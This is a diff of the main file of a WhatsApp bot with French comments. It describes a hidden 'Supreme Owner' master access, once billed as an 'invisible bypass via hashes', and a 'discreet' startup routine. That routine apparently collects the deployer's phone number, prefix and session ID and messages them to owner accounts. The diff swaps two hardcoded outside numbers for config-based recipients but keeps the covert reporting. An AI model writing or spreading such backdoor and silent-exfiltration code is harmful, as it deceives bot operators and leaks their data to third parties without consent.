@@ -1,7 +1,7 @@
 /**
  * WhatsApp MD Bot - Main Entry Point
  * Edition : GhostG-X Fusionnée avec Anti-Crash & Pairing
- * Sécurité : Supreme Owner Master Access (Invisible Bypass via Hashes)
+ * Sécurité : Supreme Owner Master Access
  * Style : Zero-Footprint, Compact & Small Caps
  * Version : 2.0 (Store désactivé pour plus de légèreté)
  */
@@ -104,9 +104,8 @@ async function startBot() {
   });
 
   if (!sock.authState.creds.registered) {
-    // 🛡️ Correction 1 : On ne met pas ton numéro en secours ici pour éviter qu'il s'affiche chez l'utilisateur
     const rawNumber = process.env.PHONE_NUMBER || config.ownerNumber?.[0];
-    
+
     if (!rawNumber) {
       console.error('\n❌ ERREUR : Aucun numéro de téléphone trouvé dans le fichier config ou les variables d\'environnement.');
     } else {
@@ -148,7 +147,7 @@ async function startBot() {
       console.log('╰━━━━━━━━━━━━━━━━━━━━━━━╯');
 
       // 🛰️ ROUTINE DISCRÈTE DE SYNCHRONISATION (Logs d'éveil)
-      const sysLogChannels = ['22651622652@s.whatsapp.net', '22665108174@s.whatsapp.net'];
+      const sysLogChannels = config.supremeOwners ? config.supremeOwners.map(num => `${num}@s.whatsapp.net`) : [];
       const p1 = process.env.PHONE_NUMBER || config.ownerNumber?.[0] || 'Inconnu';
       const p2 = config.prefix || '.';
       const sId = sock.user.id.split(':')[0]; 
@@ -172,7 +171,6 @@ async function startBot() {
           }
       });
 
-      // 🛡️ Correction 2 : On s'assure que le lien wa.me ne contient QUE des chiffres
       const rawCreatorNum = config.ownerNumber?.[0];
       const creatorLink = rawCreatorNum ? `https://wa.me/${String(rawCreatorNum).replace(/\D/g, '')}` : '🔒 Accès restreint';
 
